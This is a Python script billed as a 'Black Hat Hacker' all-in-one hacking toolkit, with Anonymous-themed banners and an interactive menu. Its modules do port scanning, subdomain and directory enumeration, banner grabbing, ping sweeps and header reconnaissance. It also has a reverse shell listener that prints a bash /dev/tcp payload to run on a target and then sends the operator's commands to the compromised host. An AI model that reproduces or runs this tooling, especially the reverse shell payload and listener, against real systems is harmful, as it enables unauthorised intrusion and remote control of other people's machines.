#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════╗
   BLACK HAT HACKER — ALL IN ONE HACKING TOOLKIT
   Coded by: Cyber Security Engineer — Mr. Sabaz Ali Khan
╚═══════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import threading
import subprocess
import random
import shutil
import urllib.request

# ==================== COLORS (ANSI) ====================
class C:
    G   = "\033[1;92m"   # Green
    R   = "\033[1;91m"   # Red
    W   = "\033[1;97m"   # White
    Y   = "\033[1;93m"   # Yellow
    CY  = "\033[1;96m"   # Cyan
    B   = "\033[1;94m"   # Blue
    M   = "\033[1;95m"   # Magenta
    RES = "\033[0m"

# ==================== BANNER ====================
BANNER = f"""{C.G}
   ▄████  ██▓     ██▓▄▄▄█████▓  ██████  ▄▄▄       ▄████ ▓█████  ██▀███  
  ██▒ ▀█▒▓██▒    ▓██▒▓  ██▒ ▓▒▒██    ▒ ▒████▄     ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
 ▒██░▄▄▄░▒██░    ▒██▒▒ ▓██░ ▒░░ ▓██▄   ▒██  ▀█▄  ▒██░▄▄▄░▒███   ▓██░▄█ ▒▒
 ░▓█  ██▓▒██░    ░██░░ ▓██▓ ░   ▒   ██▒░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
 ░▒▓███▀▒░██████▒░██░  ▒██▒ ░ ▒██████▒▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
{C.RES}{C.W}
        ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
        ████╗  ██║██╔════╝   ██╔╝ ██║    ██║██╔════╝ ██╔══██╗██║ ██╔╝
        ██╔██╗ ██║█████╗     ██║  ██║ █╗ ██║██║  ███╗██████╔╝█████╔╝ 
        ██║╚██╗██║██╔══╝     ██║  ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
        ██║ ╚████║███████╗   ██║  ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
        ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{C.RES}{C.R}
  ╔══════════════════════════════════════════════════════════════╗
  ║   [+] BLACK HAT HACKER  |  ALL IN ONE HACKING TOOLS           ║
  ║   [+] Coded by : Cyber Security Engineer — Mr. Sabaz Ali Khan ║
  ║   [+] Style    : Anonymous + Matrix Edition                   ║
  ╚══════════════════════════════════════════════════════════════╝
{C.RES}"""

MENU = f"""{C.CY}
   ┌───────────────────────────────────────────────────────┐
   │              ALL-IN-ONE HACKING MODULES               │
   └───────────────────────────────────────────────────────┘{C.RES}
   {C.G}[1]{C.RES}  Port Scanner
   {C.G}[2]{C.RES}  Subdomain / DNS Recon
   {C.G}[3]{C.RES}  Banner Grabbing (Service Fingerprint)
   {C.G}[4]{C.RES}  Ping Sweep (Host Discovery)
   {C.G}[5]{C.RES}  IP Geolocation Lookup
   {C.G}[6]{C.RES}  Web Technology / Header Recon
   {C.G}[7]{C.RES}  Directory Fuzzer (dirb style)
   {C.G}[8]{C.RES}  Reverse Shell Listener
   {C.G}[9]{C.RES}  Anonymous Mask Animation
   {C.G}[0]{C.RES}  Exit
{C.Y}   ───────────────────────────────────────────────────────{C.RES}
"""

# ==================== MATRIX RAIN INTRO ====================
COLS = ["1", "0", "A", "F", "E", "7", "$", "#", "@", "%"]

def matrix_intro(duration=3):
    cols = shutil.get_terminal_size().columns
    end = time.time() + duration
    while time.time() < end:
        line = "".join(random.choice(COLS) for _ in range(cols))
        color = random.choice([C.G, C.G, C.G, C.CY])
        print(f"{color}{line}{C.RES}")
        time.sleep(0.05)

# ==================== MODULES ====================
def port_scanner():
    target = input(f"{C.Y}[?] Target IP/Host: {C.RES}").strip()
    ports = input(f"{C.Y}[?] Ports (e.g. 21,22,80,443 or 1-1024): {C.RES}").strip()
    try:
        host = socket.gethostbyname(target)
    except socket.gaierror:
        print(f"{C.R}[!] Could not resolve target{C.RES}"); return
    if "-" in ports:
        s, e = map(int, ports.split("-")); port_list = range(s, e + 1)
    else:
        port_list = [int(p) for p in ports.split(",")]
    print(f"{C.G}[*] Scanning {host} ...{C.RES}")
    open_ports = []
    lock = threading.Lock()
    def scan(p):
        try:
            s = socket.socket(); s.settimeout(0.6)
            if s.connect_ex((host, p)) == 0:
                with lock:
                    open_ports.append(p)
                    print(f"  {C.G}[+]{C.RES} Port {p}/tcp  {C.CY}OPEN{C.RES}")
            s.close()
        except Exception:
            pass
    threads = [threading.Thread(target=scan, args=(p,)) for p in port_list]
    for t in threads: t.start()
    for t in threads: t.join()
    print(f"{C.G}[*] Done. {len(open_ports)} open port(s).{C.RES}")

def subdomain_recon():
    target = input(f"{C.Y}[?] Domain (e.g. example.com): {C.RES}").strip()
    subs = ["www","mail","ftp","admin","cpanel","webmail","ns1","ns2",
            "vpn","remote","dev","test","staging","api","portal","shop",
            "blog","intranet","git","jenkins"]
    print(f"{C.G}[*] Enumerating subdomains for {target} ...{C.RES}")
    for sub in subs:
        fq = f"{sub}.{target}"
        try:
            ip = socket.gethostbyname(fq)
            print(f"  {C.G}[+]{C.RES} {fq:<28} -> {C.CY}{ip}{C.RES}")
        except socket.gaierror:
            pass
    print(f"{C.G}[*] Recon complete.{C.RES}")

def banner_grab():
    target = input(f"{C.Y}[?] Target IP: {C.RES}").strip()
    port = int(input(f"{C.Y}[?] Port: {C.RES}").strip() or 80)
    try:
        s = socket.socket(); s.settimeout(3)
        s.connect((target, port))
        if port in (80, 8080):
            s.send(b"HEAD / HTTP/1.1\r\nHost: %s\r\n\r\n" % target.encode())
        data = s.recv(2048).decode(errors="ignore").strip()
        print(f"{C.G}[+] Banner:{C.RES}\n{C.CY}{data}{C.RES}")
        s.close()
    except Exception as e:
        print(f"{C.R}[!] Failed: {e}{C.RES}")

def ping_sweep():
    net = input(f"{C.Y}[?] Network (e.g. 192.168.1): {C.RES}").strip()
    print(f"{C.G}[*] Sweeping {net}.0/24 ...{C.RES}")
    alive = []
    def ping(i):
        r = subprocess.run(["ping", "-c", "1", "-W", "1", f"{net}.{i}"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if r.returncode == 0:
            alive.append(f"{net}.{i}")
    threads = [threading.Thread(target=ping, args=(i,)) for i in range(1, 255)]
    for t in threads: t.start()
    for t in threads: t.join()
    for ip in alive:
        print(f"  {C.G}[+]{C.RES} Host {ip} is {C.CY}UP{C.RES}")
    print(f"{C.G}[*] {len(alive)} host(s) alive.{C.RES}")

def geo_lookup():
    ip = input(f"{C.Y}[?] IP address: {C.RES}").strip()
    try:
        url = f"http://ip-api.com/line/{ip}"
        data = urllib.request.urlopen(url, timeout=5).read().decode()
        print(f"{C.G}[+] Geolocation:{C.RES}\n{C.CY}{data}{C.RES}")
    except Exception as e:
        print(f"{C.R}[!] Lookup failed: {e}{C.RES}")

def header_recon():
    url = input(f"{C.Y}[?] URL (http://target): {C.RES}").strip()
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "BlackHat-Scanner/1.0"})
        resp = urllib.request.urlopen(req, timeout=6)
        print(f"{C.G}[+] Status: {resp.status}{C.RES}")
        for k, v in resp.headers.items():
            print(f"  {C.CY}{k}:{C.RES} {v}")
    except Exception as e:
        print(f"{C.R}[!] Error: {e}{C.RES}")

def dir_fuzzer():
    base = input(f"{C.Y}[?] Base URL (http://target): {C.RES}").strip().rstrip("/")
    words = ["admin","login","wp-admin","dashboard","backup",".git","robots.txt",
             "config","phpmyadmin","uploads","api","test","private","shell"]
    print(f"{C.G}[*] Fuzzing directories on {base} ...{C.RES}")
    for w in words:
        try:
            r = urllib.request.urlopen(f"{base}/{w}", timeout=4)
            print(f"  {C.G}[+]{C.RES} /{w:<15} -> {C.CY}HTTP {r.status}{C.RES}")
        except urllib.error.HTTPError as e:
            print(f"  {C.Y}[~]{C.RES} /{w:<15} -> HTTP {e.code}")
        except Exception:
            pass
    print(f"{C.G}[*] Fuzz complete.{C.RES}")

def listener():
    lport = int(input(f"{C.Y}[?] Listen port: {C.RES}").strip() or 4444)
    print(f"{C.G}[*] Reverse shell listener on 0.0.0.0:{lport} ...{C.RES}")
    print(f"{C.Y}[*] On target: bash -i >& /dev/tcp/<YOUR_IP>/{lport} 0>&1{C.RES}")
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", lport)); s.listen(1)
    conn, addr = s.accept()
    print(f"{C.G}[+] Connection from {addr[0]}{C.RES}")
    while True:
        cmd = input("shell> ")
        if cmd in ("exit", "quit"):
            conn.send(b"exit\n"); break
        conn.send(cmd.encode() + b"\n")
        try:
            out = conn.recv(65536).decode(errors="ignore")
            print(out)
        except Exception:
            pass
    conn.close(); s.close()

def anonymous_mask():
    frames = [
        r"  \m/  ANONYMOUS  \m/  ",
        r"  ( •  • )  WE ARE LEGION  ",
        r"  ( ¬  ¬ )  WE DO NOT FORGIVE  ",
        r"  \m/ EXPECT US \m/  ",
    ]
    for _ in range(8):
        print(f"\r{C.G}{random.choice(frames):^60}{C.RES}", end="")
        time.sleep(0.4)
    print()

# ==================== MAIN ====================
MODULES = {
    "1": port_scanner, "2": subdomain_recon, "3": banner_grab,
    "4": ping_sweep, "5": geo_lookup, "6": header_recon,
    "7": dir_fuzzer, "8": listener, "9": anonymous_mask,
}

def main():
    os.system("clear" if os.name != "nt" else "cls")
    matrix_intro(2.5)
    while True:
        print(BANNER)
        print(MENU)
        choice = input(f"{C.R}  blackhat@anonymous:~$ {C.RES}").strip()
        if choice == "0":
            print(f"{C.R}  [+] Anonymous says: EXPECT US ...{C.RES}")
            sys.exit(0)
        fn = MODULES.get(choice)
        if fn:
            try:
                fn()
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!] Module interrupted{C.RES}")
            input(f"\n{C.CY}[*] Press Enter to continue...{C.RES}")
            os.system("clear" if os.name != "nt" else "cls")
        else:
            print(f"{C.R}[!] Invalid option!{C.RES}")
            time.sleep(1)

if __name__ == "__main__":
    main()
